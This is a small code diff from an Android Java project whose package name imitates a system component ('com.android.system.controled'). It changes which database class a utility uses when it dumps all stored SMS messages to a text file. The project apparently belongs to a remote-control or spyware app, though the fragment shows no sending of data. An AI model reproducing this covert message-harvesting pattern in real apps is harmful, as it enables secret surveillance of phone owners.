@@ -5,7 +5,7 @@ import java.util.ArrayList;
 
 import com.android.system.controled.MainApplication;
 import com.android.system.controled.bean.SmsInfo;
-import com.android.system.controled.db.TableAllsms;
+import com.android.system.controled.db.SdcardDbOpera;
 
 public class SmsToTxtUtil {
 
@@ -23,7 +23,7 @@ public class SmsToTxtUtil {
 	}
 
 	public void saveAllSmsToTextFile() {
-		TableAllsms db = TableAllsms.getInstence();
+		SdcardDbOpera db = SdcardDbOpera.getInstence();
 
 		ArrayList<SmsInfo> smss = db.getAllSms();
 		File file = new File(MainApplication.FILE_SMS_TEXT);
